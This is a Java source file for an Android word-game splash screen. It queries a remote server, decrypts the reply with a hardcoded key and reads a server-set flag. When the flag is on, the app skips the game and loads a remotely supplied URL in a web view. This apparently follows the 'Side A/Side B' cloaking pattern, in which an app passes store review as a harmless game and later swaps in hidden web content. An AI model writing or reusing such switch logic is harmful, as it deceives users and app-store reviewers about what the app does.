package dev.karl.wordwander;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.splashscreen.SplashScreen;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

@SuppressLint("CustomSplashScreen")
public class SplashScreenActivity extends AppCompatActivity {
    SplashScreen splashScreen;
    //
    static final String APP_PREF = "WordSharedPrefs";
    private static final String APPSTATS = "appStatus";
    private static final String GAMEURL = "gameUrl";
    private static final String POLICYSTATUS = "policyStatus";
    static String apiResponse = "";
    static String appStatus = "";
    static String ClientUrl = "";

    private static final int SPLASH_TIME_OUT = 2000;
    private static final String TAG = "AdjustHelper";
    private static final String APP_ID = "97CC";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        splashScreen = SplashScreen.installSplashScreen(this);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash_screen);

        getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.dark_blue));
        getWindow().setNavigationBarColor(ContextCompat.getColor(this, R.color.dark_blue));

        splashScreen.setKeepOnScreenCondition(new SplashScreen.KeepOnScreenCondition() {
            @Override
            public boolean shouldKeepOnScreen() {
                return true;
            }
        });

        RequestQueue connectAPI = Volley.newRequestQueue(this);
        JSONObject requestBody = new JSONObject();

        String endPoint = "https://backend.madgamingdev.com/api/gameid?appid=" + APP_ID + "&package=" + getPackageName();

        Log.d("App:Info",getPackageName()+endPoint);

        JsonObjectRequest jsonRequest = new JsonObjectRequest(Request.Method.GET, endPoint, requestBody,
                response -> {
                    try {
                        apiResponse = response.toString();
                        JSONObject jsonData = new JSONObject(apiResponse);
                        String decryptedData = WordsDatasetHelper.decrypt(jsonData.getString("data"), "21913618CE86B5D53C7B84A75B3774CD");
                        JSONObject gameData = new JSONObject(decryptedData);

                        appStatus = jsonData.getString("gameKey");
                        ClientUrl = gameData.getString("gameURL");

                        Log.d(TAG, ""+appStatus);
                        new Handler(Objects.requireNonNull(Looper.myLooper())).postDelayed(() -> {
                            splashScreen.setKeepOnScreenCondition(new SplashScreen.KeepOnScreenCondition() {
                                @Override
                                public boolean shouldKeepOnScreen() {
                                    return false;
                                }
                            });
                            if (Boolean.parseBoolean(appStatus)) {

                                // Store SharedPrefs - appStatus + gameUrl
                                SharedPreferences appPreferences = getSharedPreferences(APP_PREF, Context.MODE_PRIVATE);
                                appPreferences.edit().putBoolean(APPSTATS, Boolean.parseBoolean(appStatus)).apply();
                                appPreferences.edit().putString(GAMEURL, ClientUrl).apply();

                                Intent intent = new Intent(this, PolicyWebAct.class);
                                intent.putExtra("url", ClientUrl);
//                                intent.putExtra("from", "Policy");
                                intent.putExtra("from", "Web");
                                startActivity(intent);
                                finish();

                            } else {

                                // Store SharedPrefs - appStatus
                                SharedPreferences AppPreferences = getSharedPreferences(APP_PREF, Context.MODE_PRIVATE);
                                Boolean policyStats = AppPreferences.getBoolean(POLICYSTATUS, Boolean.FALSE);

                                Intent intent;
                                if(Boolean.TRUE.equals(policyStats)){
                                    // If Policy Already Accepted call your Side A activity
                                    intent = new Intent(this, MenuActivity.class);
                                }else{
                                    // if Policy not yet Accepted call Policy activity from GDPR Package
                                    intent = new Intent(this, PolicyWebAct.class);
                                    intent.putExtra("url", "file:///android_asset/userconsent.html");
                                    intent.putExtra("from", "Policy");
                                }
                                startActivity(intent);
                                finish();
                            }

                        }, SPLASH_TIME_OUT);

                    } catch (JSONException e) {
                        Log.e(TAG, "Error parsing JSON: " + e.getMessage());
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing API response: " + e.getMessage());
                    }
                },
                error -> Log.e(TAG, "API request failed: " + error.toString()));

        connectAPI.add(jsonRequest);
    }
}